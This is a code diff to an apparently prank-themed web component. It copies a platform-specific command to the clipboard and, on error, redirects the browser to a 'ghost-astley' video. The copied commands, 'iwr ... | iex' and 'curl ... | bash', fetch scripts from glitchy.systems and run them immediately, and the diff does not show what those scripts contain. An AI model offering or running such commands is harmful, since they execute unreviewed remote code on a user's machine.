@@ -38,12 +38,16 @@ export default {
     },
     methods: {
         cptoclip() {
-            console.log(navigator.userAgentData.platform);
             function detect() {
-                if (navigator.userAgentData.platform.indexOf("Win") != -1){
-                    return "iwr -useb https://glitchy.systems/hey.ps1 | iex"
-                }else{
-                    return "curl -s https://glitchy.systems/hey.sh | bash"
+                try{
+                    console.log(navigator.userAgentData.platform);
+                    if (navigator.userAgentData.platform.indexOf("Win") != -1){
+                        return "iwr -useb https://glitchy.systems/hey.ps1 | iex"
+                    }else{
+                        return "curl -s https://glitchy.systems/hey.sh | bash"
+                    }
+                }catch{
+                    window.location.href = "https://glitchy.systems/ghost-astley-tokyo-music-video.mp4";
                 }
                 
             }
